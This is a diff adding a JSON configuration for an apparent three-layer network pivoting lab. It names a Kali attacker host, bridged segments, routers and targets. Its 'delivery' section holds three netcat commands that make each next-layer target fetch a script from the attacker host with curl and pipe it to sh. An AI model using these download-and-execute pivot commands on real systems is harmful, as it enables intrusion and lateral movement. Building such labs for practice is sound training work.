@@ -1,0 +1,15 @@
+{
+  "created": "2026-11-11T02:11:38+08:00",
+  "kali": "192.168.121.132",
+  "bridge": {"name": "hlab-br0", "addr": "10.10.0.1/24"},
+  "layers": [
+    {"layer": 1, "segment": "10.10.10.0/24", "router": "hlab-hop1 10.10.10.1", "target": "10.10.10.10"},
+    {"layer": 2, "segment": "10.10.20.0/24", "router": "hlab-hop2 10.10.20.1", "target": "10.10.20.10"},
+    {"layer": 3, "segment": "10.10.30.0/24", "router": "hlab-hop3 10.10.30.1", "target": "10.10.30.10"}
+  ],
+  "delivery": {
+    "layer1_from_existing_session": "printf '%s\\n' 'curl -fsSL http://192.168.121.132:9901/slt | sh' | nc -w 30 10.10.10.10 2222",
+    "layer2_from_layer1_session": "printf '%s\\n' 'curl -fsSL http://192.168.121.132:9901/slt | sh' | nc -w 30 10.10.20.10 2222",
+    "layer3_from_layer2_session": "printf '%s\\n' 'curl -fsSL http://192.168.121.132:9901/slt | sh' | nc -w 30 10.10.30.10 2222"
+  }
+}
